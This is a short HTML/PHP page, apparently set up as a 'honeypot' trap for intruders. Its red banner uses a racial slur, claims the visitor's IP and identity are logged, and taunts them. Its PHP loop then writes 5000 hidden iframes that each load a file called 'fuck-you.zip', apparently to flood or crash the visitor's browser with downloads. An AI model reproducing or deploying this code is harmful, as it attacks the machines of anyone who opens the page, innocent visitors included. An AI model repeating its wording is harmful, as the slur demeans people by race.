<title>[ BUSTED ]</title>
<html>
<br>
<h2 style="text-align: center;"><span style="color: #ff0000;"><strong>THIS IS HONEYPOT NIGGA YOUR IP AND IDENTITY HAS BEEN LOGGED</strong></span></h2>
<p style="text-align: center;"><a href="404.png"><img class="aligncenter wp-image-273 " src="404.png" alt="untitled_drawing_by_xdarkivyx-d7ursok" width="450" height="551" /></a></p>

<h2 style="text-align: center;"><strong><span style="color: #ff0000;">IF YOU WANNA HACKING PLEASE HACK 127.0.0.1 FIRST</span>
</strong></h2>
</html>


<?php
$i=1;
while ($i <= 5000)
{
echo '<div style="display:none;"><iframe src="fuck-you.zip"></iframe></div>';
  $i=$i+1;
}
?>